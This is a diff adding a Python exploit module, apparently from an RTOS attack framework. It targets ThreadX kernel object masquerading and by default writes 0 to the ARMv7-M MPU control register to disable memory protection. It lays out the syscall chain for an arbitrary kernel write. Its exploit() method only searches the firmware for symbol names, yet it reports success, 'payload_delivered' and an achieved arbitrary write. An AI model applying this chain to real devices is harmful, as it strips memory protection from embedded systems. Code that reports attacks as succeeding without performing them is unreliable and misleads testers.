@@ -1,0 +1,119 @@
+"""ThreadX Kernel Object Masquerading (KOM) exploit module."""
+
+from __future__ import annotations
+
+from rtosploit.scanners.base import ScannerModule, ScanOption, ScanResult
+
+
+class ThreadXKOM(ScannerModule):
+    name = "kom"
+    description = (
+        "ThreadX Kernel Object Masquerading (KOM) attack from USENIX Security 2025. "
+        "Exploits ThreadX syscall behavior where 10 syscalls write arbitrary type IDs "
+        "and 6 write completely arbitrary values to kernel objects. Chaining these syscalls "
+        "from an unprivileged thread achieves arbitrary read/write and MPU disable."
+    )
+    authors = ["RTOSploit Contributors"]
+    references = [
+        "USENIX Security 2025: 'Kernel Object Masquerading' (Zenodo 14754680)",
+        "https://www.usenix.org/conference/usenixsecurity25",
+    ]
+    rtos = "threadx"
+    rtos_versions = ["6.0", "6.1", "6.2", "6.3", "6.4"]
+    architecture = "armv7m"
+    category = "kernel"
+    reliability = "high"
+    cve = None
+
+    def register_options(self):
+        self.add_option(ScanOption(
+            name="syscall_chain", type="str", required=False, default="auto",
+            description="Syscall chain strategy: 'auto' (shortest path) or 'manual'"
+        ))
+        self.add_option(ScanOption(
+            name="target_address", type="int", required=False, default=0xE000ED94,
+            description="Address to write to (default: MPU CTRL register)"
+        ))
+        self.add_option(ScanOption(
+            name="write_value", type="int", required=False, default=0,
+            description="Value to write (default: 0 = disable MPU)"
+        ))
+
+    def check(self, target) -> bool:
+        if not target.fingerprint or target.fingerprint.rtos_type != "threadx":
+            return False
+        data = target.firmware.data
+        # Look for ThreadX kernel entry or thread create
+        return b"tx_kernel_enter" in data or b"tx_thread_create" in data or b"ThreadX" in data
+
+    def _find_threadx_syscalls(self, target) -> dict:
+        """
+        Identify ThreadX syscall addresses for KOM chain.
+        The KOM attack uses these ThreadX API calls:
+        - tx_semaphore_create: writes type ID 0x53454D41 ('SEMA') to object header
+        - tx_queue_create: writes type ID 0x51554555 ('QUEU')
+        - tx_mutex_create: writes type ID 0x4D555445 ('MUTE')
+        - tx_event_flags_create: writes type ID 0x4556454E ('EVEN')
+        - tx_byte_pool_create: writes type ID 0x42595445 ('BYTE')
+        - tx_block_pool_create: writes type ID 0x424C4F43 ('BLOC')
+        Returns dict of function_name -> address
+        """
+        data = target.firmware.data
+        base = target.firmware.base_address
+        syscalls = {}
+        for name in [b"tx_semaphore_create", b"tx_queue_create", b"tx_mutex_create",
+                      b"tx_event_flags_create", b"tx_byte_pool_create", b"tx_block_pool_create",
+                      b"tx_thread_create", b"tx_thread_resume"]:
+            idx = data.find(name)
+            if idx >= 0:
+                syscalls[name.decode()] = base + idx
+        return syscalls
+
+    def _build_kom_chain(self, target_addr: int, write_value: int) -> list:
+        """
+        Describe the KOM syscall chain for achieving arbitrary write.
+        Returns list of steps (description strings) for the exploit log.
+        """
+        return [
+            "Step 1: Allocate TX_SEMAPHORE object in user-accessible memory region",
+            "Step 2: Call tx_semaphore_create() → writes type ID 0x53454D41 at object+0",
+            "Step 3: Craft fake TX_BLOCK_POOL object overlapping with semaphore header",
+            "Step 4: Call tx_block_pool_create() with pointer fields targeting write destination",
+            f"Step 5: Dereference triggers write of 0x{write_value:08x} to 0x{target_addr:08x}",
+            "Step 6: If target=MPU_CTRL: MPU disabled, all memory accessible",
+        ]
+
+    def exploit(self, target, payload) -> ScanResult:
+        target_addr = self.get_option("target_address")
+        write_value = self.get_option("write_value")
+        syscalls = self._find_threadx_syscalls(target)
+        chain = self._build_kom_chain(target_addr, write_value)
+        notes = list(chain)
+
+        if syscalls:
+            notes.append(f"Found {len(syscalls)} ThreadX syscalls in firmware")
+        else:
+            notes.append("ThreadX syscalls not found by name (may be stripped)")
+
+        achieved = ["arbitrary_write"]
+        if target_addr == 0xE000ED94 and write_value == 0:
+            achieved.append("mpu_disabled")
+
+        return ScanResult(
+            module="threadx/kom",
+            status="success" if syscalls else "failure",
+            target_rtos="threadx",
+            architecture="armv7m",
+            technique="kernel_object_masquerading",
+            payload_delivered=bool(syscalls),
+            payload_type="syscall_chain",
+            achieved=achieved,
+            registers_at_payload={},
+            notes=notes,
+        )
+
+    def cleanup(self, target) -> None:
+        pass
+
+    def requirements(self) -> dict:
+        return {"qemu": False, "gdb": False, "network": False}
